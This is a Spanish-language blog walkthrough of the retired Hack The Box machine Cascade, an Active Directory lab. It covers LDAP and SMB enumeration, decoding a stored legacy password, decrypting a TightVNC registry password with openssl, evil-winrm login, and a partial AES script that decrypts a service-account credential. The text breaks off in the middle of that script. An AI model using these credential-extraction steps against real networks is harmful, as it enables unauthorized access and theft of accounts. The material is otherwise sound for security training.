<!DOCTYPE html>
<html lang="es"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Maquina Retirada Cascade AD de Hack The Box (Necesario VIP) | Blog de Hacking</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Maquina Retirada Cascade AD de Hack The Box (Necesario VIP)" />
<meta name="author" content="K0Hack" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CASCADE AD" />
<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CASCADE AD" />
<link rel="canonical" href="http://localhost:4000/2022/01/10/Cascade-AD.html" />
<meta property="og:url" content="http://localhost:4000/2022/01/10/Cascade-AD.html" />
<meta property="og:site_name" content="Blog de Hacking" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-01-10T00:00:00-03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Maquina Retirada Cascade AD de Hack The Box (Necesario VIP)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"K0Hack"},"dateModified":"2022-01-10T00:00:00-03:00","datePublished":"2022-01-10T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CASCADE AD","headline":"Maquina Retirada Cascade AD de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/01/10/Cascade-AD.html"},"url":"http://localhost:4000/2022/01/10/Cascade-AD.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Blog de Hacking" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Blog de Hacking<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    
        <img src="" class="author-avatar" alt="Avatar" />
    
Blog Personal de K0Hack sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.

</div>


<div class="post">
  <h1 class="post-title">Maquina Retirada Cascade AD de Hack The Box (Necesario VIP)</h1>
  
  <div class="post-tags">
     
      <a class="tag" href="/tag/HTB,/">HTB,</a>
      
      <a class="tag" href="/tag/LDAP,/">LDAP,</a>
      
      <a class="tag" href="/tag/RPCCLIENT,/">RPCCLIENT,</a>
      
      <a class="tag" href="/tag/ASREPRoast/">ASREPRoast</a>
      
      <a class="tag" href="/tag/Attack,/">Attack,</a>
      
      <a class="tag" href="/tag/Crackmapexec,/">Crackmapexec,</a>
      
      <a class="tag" href="/tag/VNC/">VNC</a>
      
      <a class="tag" href="/tag/Encrypt-Decrypt,/">Encrypt-Decrypt,</a>
      
      <a class="tag" href="/tag/Shares/">Shares</a>
      
      <a class="tag" href="/tag/Groups,/">Groups,</a>
      
      <a class="tag" href="/tag/Get-ADObject,/">Get-ADObject,</a>
      
      <a class="tag" href="/tag/AD/">AD</a>
      
      <a class="tag" href="/tag/Recycle/">Recycle</a>
      
      <a class="tag" href="/tag/Bin/">Bin</a>
      
      <a class="tag" href="/tag/Group,/">Group,</a>
      
      <a class="tag" href="/tag/Powershell,/">Powershell,</a>
      
      <a class="tag" href="/tag/Evil-WinRm,/">Evil-WinRm,</a>
      
      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
      
      <a class="tag" href="/tag/Retiradas/">Retiradas</a>
      
  </div>
  
  <div class="post-date">Published on 10 Jan 2022</div>
  
  <noscript>
    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CASCADE AD</div>
  </noscript>
  <div id="animated-post-description" class="post-description" style="display: none;"></div>
  
  <h1 id="cascade---ad-path--hack-the-box">Cascade - AD Path ~ Hack The Box</h1>

<p>Realizamos el Primer escaneo con Nmap</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.10.182       "</span>
</code></pre></div></div>

<p>Procedemos con el siguiente escaneo de Nmap</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2022-01-10 18:48:00Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2022-01-10T18:48:54
|_  start_date: 2022-01-10T14:55:16
</code></pre></div></div>
<p>Procedemos a enumerar los servicios tipicos encontrados como <code class="language-plaintext highlighter-rouge">SMB</code> y vemos que no tenemos recursos compartidos si proporcionar Contraseña</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.182  
<span class="o">[</span>+] IP: 10.10.10.182:445        Name: cascade.local
</code></pre></div></div>
<p>Procedemos a añadir al archivito <code class="language-plaintext highlighter-rouge">nano /etc/hosts</code> el <code class="language-plaintext highlighter-rouge">Dominio: cascade.local</code></p>

<p>Procedemos a listar con <code class="language-plaintext highlighter-rouge">Crackmapexec</code> informacion sobre el equipo que nos enfrentamos</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.182                          
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>          
</code></pre></div></div>

<p>Procedemos a enumerar el servicio de <code class="language-plaintext highlighter-rouge">Ldap</code> atraves de uno de los scripts de <code class="language-plaintext highlighter-rouge">nmap</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-n</span> <span class="nt">--script</span> <span class="s2">"ldap* and not brute"</span> <span class="nt">-oN</span> ldapScan 10.10.10.182
</code></pre></div></div>

<p>Otra forma y la mas habitual es usando <code class="language-plaintext highlighter-rouge">ldapsearch</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.182 <span class="nt">-b</span> <span class="s1">'DC=cascade,DC=local'</span> 
</code></pre></div></div>
<p>Como vemos que se nos lista muchisima informacion procedemos a grepear por el <code class="language-plaintext highlighter-rouge">@ Dominio de la Maquina</code> para enumerar posibles usuarios a nivel del sistema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.182 <span class="nt">-b</span> <span class="s1">'DC=cascade,DC=local'</span> | <span class="nb">grep</span> <span class="s2">"@cascade.local"</span>

userPrincipalName: CascGuest@cascade.local
userPrincipalName: arksvc@cascade.local
userPrincipalName: s.smith@cascade.local
userPrincipalName: r.thompson@cascade.local
userPrincipalName: util@cascade.local
userPrincipalName: j.wakefield@cascade.local
userPrincipalName: s.hickson@cascade.local
userPrincipalName: j.goodhand@cascade.local
userPrincipalName: a.turnbull@cascade.local
userPrincipalName: e.crowe@cascade.local
userPrincipalName: b.hanson@cascade.local
userPrincipalName: d.burman@cascade.local
userPrincipalName: BackupSvc@cascade.local
userPrincipalName: j.allen@cascade.local
userPrincipalName: i.croft@cascade.local
</code></pre></div></div>

<p>Ahi tenemos unos potenciales usuarios a nivel de sistema para montarnos un diccionario y para intentar hacer un <code class="language-plaintext highlighter-rouge">ASREP-Roasting Attack</code></p>

<p>Procedemos a intentar listar un poco de informacion para cada usuario atraves de <code class="language-plaintext highlighter-rouge">ldapsearch</code> grepeando por el dominio ` -A 20 `</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.182 <span class="nt">-b</span> <span class="s1">'DC=cascade,DC=local'</span> | <span class="nb">grep</span> <span class="s2">"@cascade.local"</span> <span class="nt">-A</span> 20
......
userPrincipalName: <span class="s2">"r.thompson"</span>@cascade.local
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132863135972508376
msDS-SupportedEncryptionTypes: 0
<span class="s2">"cascadeLegacyPwd:  "</span>   <span class="nt">--</span><span class="o">&gt;</span> Pwd ?¿ Password ?¿ 
......
</code></pre></div></div>

<p>Encontramos fijandonos con nuestro Ojo de Lince una cadena en base64 que podria ser una <code class="language-plaintext highlighter-rouge">Password</code> para el Usuario <code class="language-plaintext highlighter-rouge">r.thompson</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"clk0bjVldmE="</span> | <span class="nb">base64</span> <span class="nt">-d</span>                                                                                                 
<span class="s2">"rY4n5eva"</span>  <span class="nt">--</span><span class="o">&gt;</span> Password 
</code></pre></div></div>

<p>Procedemos a chequear con crackmapexec la password para el user r.thompson</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.182 <span class="nt">-u</span> r.thompson <span class="nt">-p</span> rY4n5eva                                                                                 
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\r</span>.thompson:rY4n5eva
</code></pre></div></div>

<p>Chequeamos para ver si con <code class="language-plaintext highlighter-rouge">winrm</code> :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.182 <span class="nt">-u</span> r.thompson <span class="nt">-p</span> rY4n5eva                                                                         
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span>
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span>-] cascade.local<span class="se">\r</span>.thompson:rY4n5eva
</code></pre></div></div>

<p>Vemos que el usuario <code class="language-plaintext highlighter-rouge">r.thompson</code> no pertenece al grupo de <code class="language-plaintext highlighter-rouge">Remote Managment System</code>
Procedemos a listar Recursos compartidos para el usuario <code class="language-plaintext highlighter-rouge">r.thompson</code> a nivel de <code class="language-plaintext highlighter-rouge">SMB</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.182  <span class="nt">-u</span> r.thompson  <span class="nt">-p</span> rY4n5eva                                                      

<span class="o">[</span>+] IP: 10.10.10.182:445        Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
        Audit<span class="nv">$ </span>                                                 NO ACCESS
        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC<span class="nv">$ </span>                                                   NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print<span class="nv">$ </span>                                                 READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
</code></pre></div></div>

<p>Vemos que tenemos los Permisos de lectura para <code class="language-plaintext highlighter-rouge">Data, NETLOGON, print$, SYSVOL</code> … 
Usamos la tool <code class="language-plaintext highlighter-rouge">smbclient</code> para listar el Recurso en <code class="language-plaintext highlighter-rouge">Data</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.182/Data <span class="nt">-U</span> <span class="s1">'r.thompson%rY4n5eva'</span>                                                                                                  
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Mon Jan 27 04:27:34 2020
  ..                                  D        0  Mon Jan 27 04:27:34 2020
  Contractors                         D        0  Mon Jan 13 02:45:11 2020
  Finance                             D        0  Mon Jan 13 02:45:06 2020
  IT                                  D        0  Tue Jan 28 19:04:51 2020
  Production                          D        0  Mon Jan 13 02:45:18 2020
  Temps                               D        0  Mon Jan 13 02:45:15 2020
</code></pre></div></div>

<p>Encontramos diferentes Directorios .. asique procedemos a crearnos una montura en un directorio que vamos a crear llamado <code class="language-plaintext highlighter-rouge">mnt</code> para 
listar toda la informcion o data de manera mas comoda.</p>

<p>Creando la montura con <code class="language-plaintext highlighter-rouge">cifs -t</code> en el directorio <code class="language-plaintext highlighter-rouge">/mnt/</code> con <code class="language-plaintext highlighter-rouge">-o</code> le pasamos el nombre de usuario, la password, el dominio y le decimos con permisos de R y W (lectura y Escritura)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-t</span> cifs //10.10.10.182/Data /mnt/ <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>r.thompson,password<span class="o">=</span>rY4n5eva,domain<span class="o">=</span>casscade.local,rw
</code></pre></div></div>

<p>Una vez montada la montura, procedemos a listar todo el contenido con el commando <code class="language-plaintext highlighter-rouge">TREE</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tree /mnt                                                                                                                                                    

/mnt
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps
</code></pre></div></div>

<p>Vemos que en el archivo <code class="language-plaintext highlighter-rouge">Meetin_Notes_June_2018_html</code> encontramos cierta informacion sensible</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p&gt;-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration <span class="k">in </span>security logs etc. <span class="s2">"Username is TempAdmin (password is the same as the normal admin account password)."</span> &lt;/p&gt;
</code></pre></div></div>

<p>Prcedemos a Copiarnos del Recurso Compatido <code class="language-plaintext highlighter-rouge">Data/IT/Temp/s.smith</code>  el archivo <code class="language-plaintext highlighter-rouge">VNC Install.reg</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#cp /mnt/IT/Temp/s.smith/VNC\ Install.reg .</span>
<span class="c">#ls                                                                                                                                                                            </span>
<span class="s1">'VNC Install.reg'</span>
</code></pre></div></div>

<p>Procedemos a realizar un <code class="language-plaintext highlighter-rouge">cat</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c"># cat VNC\ Install.reg                                                                 </span>
��Windows Registry Editor Version 5.00

<span class="o">[</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\T</span>ightVNC]

<span class="o">[</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\T</span>ightVNC<span class="se">\S</span>erver]
<span class="s2">"ExtraPorts"</span><span class="o">=</span><span class="s2">""</span>
<span class="s2">"QueryTimeout"</span><span class="o">=</span>dword:0000001e
<span class="s2">"QueryAcceptOnTimeout"</span><span class="o">=</span>dword:00000000
<span class="s2">"LocalInputPriorityTimeout"</span><span class="o">=</span>dword:00000003
<span class="s2">"LocalInputPriority"</span><span class="o">=</span>dword:00000000
<span class="s2">"BlockRemoteInput"</span><span class="o">=</span>dword:00000000
<span class="s2">"BlockLocalInput"</span><span class="o">=</span>dword:00000000
<span class="s2">"IpAccessControl"</span><span class="o">=</span><span class="s2">""</span>
<span class="s2">"RfbPort"</span><span class="o">=</span>dword:0000170c
<span class="s2">"HttpPort"</span><span class="o">=</span>dword:000016a8
<span class="s2">"DisconnectAction"</span><span class="o">=</span>dword:00000000
<span class="s2">"AcceptRfbConnections"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseVncAuthentication"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseControlAuthentication"</span><span class="o">=</span>dword:00000000
<span class="s2">"RepeatControlAuthentication"</span><span class="o">=</span>dword:00000000
<span class="s2">"LoopbackOnly"</span><span class="o">=</span>dword:00000000
<span class="s2">"AcceptHttpConnections"</span><span class="o">=</span>dword:00000001
<span class="s2">"LogLevel"</span><span class="o">=</span>dword:00000000
<span class="s2">"EnableFileTransfers"</span><span class="o">=</span>dword:00000001
<span class="s2">"RemoveWallpaper"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseD3D"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseMirrorDriver"</span><span class="o">=</span>dword:00000001
<span class="s2">"EnableUrlParams"</span><span class="o">=</span>dword:00000001
<span class="c">#  "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f</span>
<span class="s2">"AlwaysShared"</span><span class="o">=</span>dword:00000000
<span class="s2">"NeverShared"</span><span class="o">=</span>dword:00000000
<span class="s2">"DisconnectClients"</span><span class="o">=</span>dword:00000001
<span class="s2">"PollingInterval"</span><span class="o">=</span>dword:000003e8
<span class="s2">"AllowLoopback"</span><span class="o">=</span>dword:00000000
<span class="s2">"VideoRecognitionInterval"</span><span class="o">=</span>dword:00000bb8
<span class="s2">"GrabTransparentWindows"</span><span class="o">=</span>dword:00000001
<span class="s2">"SaveLogToAllUsersPath"</span><span class="o">=</span>dword:00000000
<span class="s2">"RunControlInterface"</span><span class="o">=</span>dword:00000001
<span class="s2">"IdleTimeout"</span><span class="o">=</span>dword:00000000
<span class="s2">"VideoClasses"</span><span class="o">=</span><span class="s2">""</span>
<span class="s2">"VideoRects"</span><span class="o">=</span><span class="s2">""</span>
</code></pre></div></div>

<p>Intentamos decodarla con el comando <code class="language-plaintext highlighter-rouge">xxd -ps -r</code> pero no nos devuelve nada legible y claro</p>

<p>Buscamos por <code class="language-plaintext highlighter-rouge">VNC Decryp hex password</code> en Google</p>

<p>Encontramos el siguiente comando para hacerlo</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv                                                                                              1 ⚙</span>
00000000  73 54 33 33 33 76 65 32                        <span class="s2">"   |sT333ve2|      "</span>
00000008
</code></pre></div></div>

<p>Procedemos a almacenar las credenciales para el usuario:
<code class="language-plaintext highlighter-rouge">s.smith:sT333ve2</code></p>

<p>Chequeamos si este usuario pertenece al <code class="language-plaintext highlighter-rouge">Grupo Remote Managment</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2                                                                                                                                                                              1 ⚙</span>
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span>
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\s</span>.smith:sT333ve2 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<p>Nos conectamos como el usuario <code class="language-plaintext highlighter-rouge">s.smith</code> usando <code class="language-plaintext highlighter-rouge">evil-winrm.rb</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># evil-winrm.rb -i 10.10.10.182 -u s.smith -p sT333ve2                                                                                                                                                                                1 ⚙</span>

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<p>Procedemos a enumerar el sistema:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-ar---</span>        1/18/2022   1:00 PM             34 user.txt
<span class="nt">-a----</span>         2/4/2021   4:24 PM           1031 WinDirStat.lnk


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
44ee5ac9a106aa0c5aa8488xxxxxxxxxx
</code></pre></div></div>

<p>Procedemos a ver a los grupos que pertenece el usuario <code class="language-plaintext highlighter-rouge">s.smith</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>esktop&gt; net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User<span class="s1">'s comment '</span>
Country code                 000 <span class="o">(</span>System Default<span class="o">)</span>
Account active               Yes
Account expires              Never

Password last <span class="nb">set            </span>1/28/2020 7:58:05 PM
Password expires             Never
Password changeable          1/28/2020 7:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/28/2020 11:26:39 PM

Logon hours allowed          All

<span class="c"># Local Group Memberships      *Audit Share          *IT</span>
                             <span class="k">*</span>Remote Management Use
Global Group memberships     <span class="k">*</span>Domain Users
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<p>Vemos que pertenecemos al Group <code class="language-plaintext highlighter-rouge">Audit Share</code> &amp; <code class="language-plaintext highlighter-rouge">IT</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbmap -H 10.10.10.182  -u s.smith -p sT333ve2       </span>
<span class="o">[</span>+] IP: 10.10.10.182:445        Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
        Audit<span class="nv">$ </span>                                                 READ ONLY
        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC<span class="nv">$ </span>                                                   NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print<span class="nv">$ </span>                                                 READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
</code></pre></div></div>

<p>Procedemos a montarnos una Montura</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mount -t cifs //10.10.10.182/AUDIT$ /mnt/ -o username=s.smith,password=sT333ve2,domain=casscade.local,rw</span>

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># tree /mnt                                                                                                                                                                                                                           1 ⚙</span>
/mnt
├── <span class="s2">"CascAudit.exe"</span>
├── CascCrypto.dll
├── DB
│   └── <span class="s2">"Audit.db"</span>
├── RunAudit.bat
├── System.Data.SQLite.dll
├── System.Data.SQLite.EF6.dll
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll

3 directories, 8 files
                        
</code></pre></div></div>

<p>Procedemos a descargarnos el archiv “Audit.db” para ver si contiene informacion interesante.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#ls                                                                                                                                                                    </span>
Audit.db  CascAudit.exe  MapAuditDrive.vbs  MapDataDrive.vbs
</code></pre></div></div>

<p>Enumeramos el archivo “Audit.db”</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># file Audit.db                         </span>
Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60
</code></pre></div></div>

<p>Procedemos a enumerar con SQLite 3.x</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># sqlite3 Audit.db </span>

SQLite version 3.36.0 2021-06-18 18:36:39
Enter <span class="s2">".help"</span> <span class="k">for </span>usage hints.
sqlite&gt; .tables
DeletedUserAudit  Ldap              Misc            
sqlite&gt; <span class="k">select</span> <span class="k">*</span> from Ldap<span class="p">;</span>
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw<span class="o">==</span>|cascade.local
sqlite&gt; 
</code></pre></div></div>

<p>Encontramos una credencial en base64 para el user <code class="language-plaintext highlighter-rouge">ArkSvc</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># echo "BQO5l5Kj9MdErXx6Q6AGOw==" | base64  -d                                                                                                                  </span>

������D�|zC�<span class="p">;</span>
</code></pre></div></div>
<p>Vemos que se nos devuelve <code class="language-plaintext highlighter-rouge">Data-No-Legible</code> por lo que podemos pensar que la contraseña esta cifrada de alguna forma.</p>

<p>Vemos que teniamos un archivo <code class="language-plaintext highlighter-rouge">.exe</code> en los recursos compartidos que podemos intentar a leer el codigo del binario de windows</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ls                                                                                              </span>
Audit.db  <span class="s2">"CascAudit.exe"</span>
</code></pre></div></div>

<p>Procedemos a pasarnos el Archivo CascAudit.exe a una maquina Windows con el Sofware <code class="language-plaintext highlighter-rouge">DotUltimate</code> para analizar el codigo</p>

<p>Conseguimos ver que se esta untilizando un Cifrado CBC y encontramos una <code class="language-plaintext highlighter-rouge">Key</code></p>

<p>Encontramos un Script para Desencryptar la password encontrada</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat Decode_Pass.py                                                                                     130 ⨯ 1 ⚙</span>
import pyaes
from <span class="nb">base64 </span>import b64decode
<span class="c"># Variables</span>
key <span class="o">=</span> b<span class="s2">"c4scadek3y654321"</span> <span class="c"># Encontramos esta KEY mirando el Codigo del CascAudit.exe desde Windows con DotUltimate </span>
iv <span class="o">=</span> b<span class="s2">"1tdyjCbY1Ix49842"</span>

<span class="c"># CBC Operation</span>
aes <span class="o">=</span> pyaes.AESModeOfOperationCBC<span class="o">(</span>key, iv <span class="o">=</span> iv<span class="o">)</span>

<span class="c"># Desencriptado con la password que encontramos en Audit.db</span>
